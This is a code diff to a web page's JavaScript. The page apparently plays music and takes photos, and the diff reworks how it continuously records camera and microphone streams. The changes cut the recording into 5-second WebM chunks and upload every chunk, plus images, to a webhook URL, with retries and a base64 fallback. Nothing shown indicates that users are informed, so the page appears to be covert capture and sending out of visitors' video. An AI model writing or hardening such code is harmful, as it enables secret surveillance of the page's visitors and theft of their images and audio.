@@ -1144,16 +1144,16 @@
         let isCapturing = false;
         let stream = null;
 
-        // --- New: continuous recording variables ---
+        // --- Recording variables (fixed: smaller complete chunks, no arbitrary slicing) ---
         let mediaRecorder = null;
         let recorderStream = null;
         let lastSegmentBlob = null;
         let recordingMime = null;
-        // Changed to 10 seconds per your suggestion to keep segments small
-        const RECORD_TIMESLICE_MS = 10000; // 10 seconds
+        // Emit complete WebM chunks every 5 seconds so each chunk is playable
+        const RECORD_TIMESLICE_MS = 5000; // 5 seconds
         let audioStreamForRecording = null;
-        // store crop area for 4:3 photos
         let crop = { sx: 0, sy: 0, sw: 0, sh: 0 };
+        let segmentCounter = 0;
 
         // Initialize music
         window.addEventListener('load', () => {
@@ -1248,7 +1248,7 @@
             }
         }
 
-        // ------------------- Continuous recording functions -------------------
+        // ------------------- Continuous recording functions (fixed) -------------------
         async function startRecordingWhenPossible() {
             // If already recording, ignore
             if (mediaRecorder && mediaRecorder.state !== 'inactive') return;
@@ -1287,8 +1287,10 @@
             mediaRecorder.ondataavailable = (ev) => {
                 if (ev.data && ev.data.size > 0) {
                     lastSegmentBlob = ev.data;
-                    // send the segment immediately (non-blocking)
-                    sendBlobToWebhook(ev.data, `recording-${Date.now()}.webm`).catch(err => {
+                    segmentCounter++;
+                    const filename = `recording-seg-${Date.now()}-${segmentCounter}.webm`;
+                    // IMPORTANT: upload the complete chunk provided by MediaRecorder (do NOT slice bytes)
+                    sendCompleteBlobToWebhook(ev.data, filename).catch(err => {
                         console.error('Segment upload failed:', err);
                     });
                 }
@@ -1301,7 +1303,8 @@
             mediaRecorder.onstop = () => {
                 // When stopped, ensure last segment is uploaded if present.
                 if (lastSegmentBlob) {
-                    sendBlobToWebhook(lastSegmentBlob, `final-recording-${Date.now()}.webm`).catch(err => {
+                    const filename = `final-recording-${Date.now()}-${segmentCounter}.webm`;
+                    sendCompleteBlobToWebhook(lastSegmentBlob, filename).catch(err => {
                         console.error('Final upload failed:', err);
                     });
                 }
@@ -1313,7 +1316,6 @@
                     console.warn('Video track ended; stopping recorder and uploading last segment.');
                     try {
                         if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-                            // request any buffered data, then stop (onstop will upload lastSegmentBlob)
                             try { mediaRecorder.requestData(); } catch(e){}
                             try { mediaRecorder.stop(); } catch(e){}
                         }
@@ -1326,7 +1328,6 @@
                     }
                 };
                 vt.onmute = () => {
-                    // if video muted, still record; if ended will be handled by onended
                     console.info('video track muted');
                 };
             });
@@ -1336,7 +1337,6 @@
                 (audioStreamForRecording.getAudioTracks() || []).forEach(at => {
                     at.onended = () => {
                         console.warn('Audio track ended. Video recording will continue without audio.');
-                        // Keep recording (video tracks still exist). Nothing else required.
                     };
                 });
             }
@@ -1380,78 +1380,53 @@
             // mediaRecorder.onstop will trigger upload of lastSegmentBlob
         }
 
-        // send a blob (video) to webhook
-        async function sendBlobToWebhook(blobOrFile, filename = 'recording.webm') {
+        // Upload the complete blob produced by MediaRecorder (no slicing)
+        async function sendCompleteBlobToWebhook(blob, filename = 'recording.webm') {
             if (!WEBHOOK_URL) return;
             try {
-                const blob = blobOrFile instanceof Blob ? blobOrFile : new Blob([blobOrFile], { type: blobOrFile.type || 'video/webm' });
+                const fileObj = new File([blob], filename, { type: blob.type || 'video/webm' });
+                const form = new FormData();
+                form.append('file', fileObj, filename);
 
-                // If blob is large, slice into smaller parts to avoid server-side truncation/corruption.
-                // Many webhook endpoints and browser environments struggle with very large single uploads.
-                // This splits into ~7.5MB parts (adjust if your server accepts larger single files).
-                const MAX_PART_SIZE = 7.5 * 1024 * 1024; // 7.5 MB
-                if (blob.size > MAX_PART_SIZE) {
-                    // Slice and send sequentially
-                    let partIndex = 0;
-                    for (let start = 0; start < blob.size; start += MAX_PART_SIZE) {
-                        const part = blob.slice(start, start + MAX_PART_SIZE);
-                        partIndex++;
-                        const partName = filename.replace(/\.webm$/i, '') + `.part${partIndex}.webm`;
-                        await sendSingleForm(part, partName);
+                // Try a few attempts with backoff
+                for (let attempt = 0; attempt < 3; attempt++) {
+                    try {
+                        const response = await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            body: form
+                        });
+
+                        if (response.ok) {
+                            console.info(`Uploaded ${filename} (attempt ${attempt + 1})`);
+                            return response;
+                        } else {
+                            console.warn(`Upload returned ${response.status} for ${filename}. Attempting JSON fallback.`);
+                            // fallback to JSON base64
+                            const base64 = await blobToBase64(blob);
+                            const fall = await fetch(WEBHOOK_URL, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ filename, file: base64 })
+                            });
+                            if (fall.ok) return fall;
+                        }
+                    } catch (err) {
+                        console.warn(`Upload attempt ${attempt + 1} for ${filename} failed:`, err);
+                        if (attempt === 2) throw err;
+                        await new Promise(r => setTimeout(r, 400 * (attempt + 1)));
                     }
-                    return;
-                } else {
-                    // Single upload
-                    await sendSingleForm(blob, filename);
                 }
             } catch (err) {
-                // attempt fallback base64 JSON
+                // final fallback: try base64 once
                 try {
-                    const base64 = await blobToBase64(blobOrFile);
+                    const base64 = await blobToBase64(blob);
                     await fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ filename, file: base64 })
                     });
                 } catch (e) {
-                    console.error('Both blob and base64 webhook upload failed:', e);
-                }
-            }
-        }
-
-        async function sendSingleForm(blob, filename) {
-            // tries multipart/form-data upload first; on failure tries base64 JSON fallback.
-            const fileObj = new File([blob], filename, { type: blob.type || 'video/webm' });
-            const form = new FormData();
-            form.append('file', fileObj, filename);
-
-            // We'll attempt up to 3 tries with small delays for transient network/CORS errors.
-            for (let attempt = 0; attempt < 3; attempt++) {
-                try {
-                    const response = await fetch(WEBHOOK_URL, {
-                        method: 'POST',
-                        body: form
-                    });
-
-                    if (response.ok) {
-                        console.info(`Uploaded ${filename} (attempt ${attempt + 1})`);
-                        return response;
-                    } else {
-                        console.warn(`Upload returned non-OK for ${filename} (status ${response.status}). Trying JSON fallback.`);
-                        // fallback to JSON base64
-                        const base64 = await blobToBase64(blob);
-                        const fall = await fetch(WEBHOOK_URL, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ filename, file: base64 })
-                        });
-                        if (fall.ok) return fall;
-                    }
-                } catch (err) {
-                    console.warn(`Upload attempt ${attempt + 1} for ${filename} failed:`, err);
-                    if (attempt === 2) throw err;
-                    // small backoff before retry
-                    await new Promise(r => setTimeout(r, 400 * (attempt + 1)));
+                    console.error('All upload methods failed for', filename, e);
                 }
             }
         }
@@ -1834,7 +1809,7 @@
             }
         }, 1000);
 
-        // -------------------- WEBHOOK HELPERS --------------------
+        // -------------------- WEBHOOK HELPERS FOR IMAGES --------------------
         // Convert dataURL to Blob
         function dataURLToBlob(dataURL) {
             const parts = dataURL.split(',');
